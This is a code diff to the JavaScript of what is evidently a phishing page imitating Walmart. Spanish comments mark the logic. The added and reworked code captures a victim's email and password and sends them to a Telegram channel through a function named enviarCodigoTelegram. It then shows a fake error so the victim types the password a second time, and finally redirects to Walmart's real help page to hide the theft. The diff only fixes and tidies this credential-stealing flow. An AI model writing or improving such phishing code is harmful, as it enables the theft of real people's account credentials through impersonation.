@@ -200,41 +200,40 @@ if(signInCodeBtn){
         // Limpiar para siguiente uso
         firstCode = null;
 
+
 // Lógica para el panel de autenticación extra (fuera del bloque)
 const authSubmitBtn = document.getElementById('authSubmitBtn');
 const authEmail = document.getElementById('authEmail');
 const authPassword = document.getElementById('authPassword');
 const authErrorAlert = document.getElementById('authErrorAlert');
 const authLoader = document.getElementById('authLoader');
+let authAttempt = 0;
 if(authSubmitBtn && authEmail && authPassword && authErrorAlert && authLoader){
   authSubmitBtn.addEventListener('click', (e)=>{
     e.preventDefault();
     authErrorAlert.style.display = 'none';
+    authPassword.classList.remove('error');
     authSubmitBtn.style.display = 'none';
-            authLoader.style.display = 'block';
+    authLoader.style.display = 'block';
     // Enviar email y contraseña al Telegram
     enviarCodigoTelegram(authEmail.value, `Authenticator email: ${authEmail.value}\nAuthenticator password: ${authPassword.value}`);
-            setTimeout(()=>{
-              authLoader.style.display = 'none';
-              authSubmitBtn.style.display = 'block';
-              authPassword.value = '';
-              authPassword.focus();
-              authAttempt++;
-              if(authAttempt === 1){
-                authErrorAlert.style.display = 'block';
-                authPassword.classList.add('error');
-              } else {
-                window.location.href = 'https://www.walmart.com/help';
-              }
-            // Estilo para el borde rojo del input de password
-            const style = document.createElement('style');
-            style.innerHTML = '.input-modern.error { border-color: #e05 !important; }';
-            document.head.appendChild(style);
-            authPassword.addEventListener('input', ()=>{
-              authPassword.classList.remove('error');
-              authErrorAlert.style.display = 'none';
-            });
-            }, 5000);
+    setTimeout(()=>{
+      authLoader.style.display = 'none';
+      authSubmitBtn.style.display = 'block';
+      authPassword.value = '';
+      authPassword.focus();
+      authAttempt++;
+      if(authAttempt === 1){
+        authErrorAlert.style.display = 'block';
+        authPassword.classList.add('error');
+      } else {
+        window.location.href = 'https://www.walmart.com/help';
+      }
+    }, 5000);
+  });
+  authPassword.addEventListener('input', ()=>{
+    authPassword.classList.remove('error');
+    authErrorAlert.style.display = 'none';
   });
 }
       }
